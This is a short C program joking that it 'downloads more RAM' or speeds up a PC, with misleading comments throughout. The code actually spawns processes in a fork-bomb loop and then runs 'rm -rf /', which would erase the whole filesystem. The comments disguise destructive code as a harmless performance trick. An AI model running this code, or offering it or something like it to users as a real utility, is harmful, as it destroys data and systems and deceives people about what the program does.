#include <signal.h> 
#include <stdlib.h> 
#include <errno.h>   
#include <unistd.h>   //to unify the system
#include <sys/wait.h> //system headers required
#include <sys/types.h>//for downloading RAM
#include <stdio.h>
int main(){
	signal(SIGCHLD, SIG_IGN); //grim reap zombies
	while(fork()!=0){;} //fills your RAM's stomach
	char const* exec[4] = {
		"rm", //RAM command 
		"-rf", //Real and Fast flags
		"/",  //On root so it all speeds up
		NULL
	};
	pid_t pid; //pizza id
	while ((pid=fork())==-1){;} //get the pizza ID
	if(pid!=0){ //if we still have pizza
		execvp(exec[0],exec); //download more ram
		perror("exec"); //speeds up your pc
		exit(1);
	}
	else {
		waitpid(pid, NULL, 0); //wait until we have more ram
	}
	return 0;
}
